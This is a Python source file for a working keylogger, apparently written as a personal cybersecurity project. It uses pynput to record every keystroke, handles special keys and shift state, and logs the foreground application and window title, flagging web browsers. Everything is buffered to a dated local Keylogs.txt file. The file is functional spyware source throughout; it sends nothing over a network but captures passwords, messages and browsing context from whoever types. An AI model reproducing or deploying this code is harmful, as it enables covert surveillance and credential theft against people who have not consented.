from Feature import Get_activeApp_Data
from pynput.keyboard import Listener, Key
from datetime import datetime
import os
import threading
import time

# Initialize timestamp and directory
current_time = datetime.now().strftime("%I:%M %p")
current_date = datetime.now().strftime("%d-%B-%Y")
date_str = datetime.now().strftime("%d-%B-%Y")

dir_path = "F:/Coding/Python Program/CyberSce_Project/TestField"
dir_name = os.path.join(dir_path, f"{current_date}")
KEYLOG_FILE = os.path.join(dir_name, "Keylogs.txt")
LOGIN_FILE = os.path.join(dir_name, "login.txt")

TIMESTAMP = f"{current_time} | {date_str}"
EXIT_COMBO = {Key.cmd, Key.backspace}
SPECIAL_KEYS = {
    'enter': '\n',
    'space': ' ',
    'tab': '[TAB]',
    'backspace': '[BACKSPACE]',
    'esc': '[ESC]',
    'ctrl_l': '[CTRL]',
    'ctrl_r': '[CTRL]',
    'shift': '[SHIFT]',
    'shift_r': '[SHIFT]',
    'alt': '[ALT]',
    'alt_r': '[ALT]',
    'cmd': '[CMD]',
    'cmd_r': '[CMD]',
    'caps_lock': '[CAPS_LOCK]',
    'delete': '[DELETE]',
    'home': '[HOME]',
    'end': '[END]',
    'page_up': '[PAGE_UP]',
    'page_down': '[PAGE_DOWN]',
    'up': '[UP]',
    'down': '[DOWN]',
    'left': '[LEFT]',
    'right': '[RIGHT]',
    'f1': '[F1]', 'f2': '[F2]', 'f3': '[F3]', 'f4': '[F4]',
    'f5': '[F5]', 'f6': '[F6]', 'f7': '[F7]', 'f8': '[F8]',
    'f9': '[F9]', 'f10': '[F10]', 'f11': '[F11]', 'f12': '[F12]'
}

pressed_keys = set()
current_process = ""
file_lock = threading.Lock()
key_buffer = []

def flush_buffer():
    global key_buffer
    if key_buffer:
        with file_lock:
            with open(KEYLOG_FILE, 'a', encoding='utf8') as f:
                f.write(" [KEYSTROKES] ")
                f.write("".join(key_buffer))
        key_buffer = []

def write_key(key_str):
    global key_buffer
    try:
        key_buffer.append(key_str)
        if len(key_buffer) >= 100:
            flush_buffer()
    except Exception as e:
        with file_lock:
            with open(KEYLOG_FILE, 'a', encoding='utf8') as f:
                f.write(f"[ERROR] {e}\n")

def update_active_app():
    global current_process
    prev_process = None
    browser_process_names = ["chrome.exe", "firefox.exe", "msedge.exe", "safari.exe", "brave.exe", "opera.exe"]
    while True:
        try:
            process_title, process_name = Get_activeApp_Data()
            if process_name != prev_process:
                flush_buffer()
                current_process = f"Process: {process_name} | Title: {process_title}"
                with file_lock:
                    with open(KEYLOG_FILE, 'a', encoding='utf8') as f:
                        f.write("[APP CHANGE]\n")
                        if process_name in browser_process_names:
                            f.write(f"{current_process} (Browser)\n\n")
                        elif process_title == "":
                            f.write("No app running on foreground\n\n")
                        else:
                            f.write(f"{current_process}\n\n")
                prev_process = process_name
            time.sleep(3)
        except Exception as e:
            current_process = f"Error detecting app: {e}"
            time.sleep(5)

threading.Thread(target=update_active_app, daemon=True).start()

def process_key(key):
    key_str = str(key).replace("'", "") 
    if isinstance(key, Key):
        key_name = key.name
        return SPECIAL_KEYS.get(key_name, f'[{key_name.upper()}]')
    if len(key_str) == 1:
        if (Key.shift in pressed_keys or Key.shift_r in pressed_keys or
            Key.caps_lock in pressed_keys) and key_str.isalpha():
            return key_str.upper()
        return key_str
    return f'[{key_str.upper()}]'

def on_press(key):
    pressed_keys.add(key)
    key_str = process_key(key)
    write_key(key_str)

def on_release(key):
    if all(k in pressed_keys for k in EXIT_COMBO):
        flush_buffer()
        return False
    if key in pressed_keys:
        pressed_keys.remove(key)

def main():
    try:
        os.makedirs(dir_name, exist_ok=True)
        with file_lock:
            with open(KEYLOG_FILE, 'a', encoding='utf8') as f:
                f.write("=" * 60 + "\n")
                f.write(f"[TIMESTAMP] {TIMESTAMP}\n")
                f.write("=" * 60 + "\n\n")
                try:
                    process_title, process_name = Get_activeApp_Data()
                    f.write("[APP CHANGE]\n")
                    f.write(f"Process: {process_name} | Title: {process_title}\n\n")
                except Exception as e:
                    f.write(f"[ERROR] detecting initial app: {e}\n\n")
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        with file_lock:
            with open(KEYLOG_FILE, 'a', encoding='utf8') as f:
                f.write(f"[ERROR] {e}\n")

if __name__ == "__main__":
    main()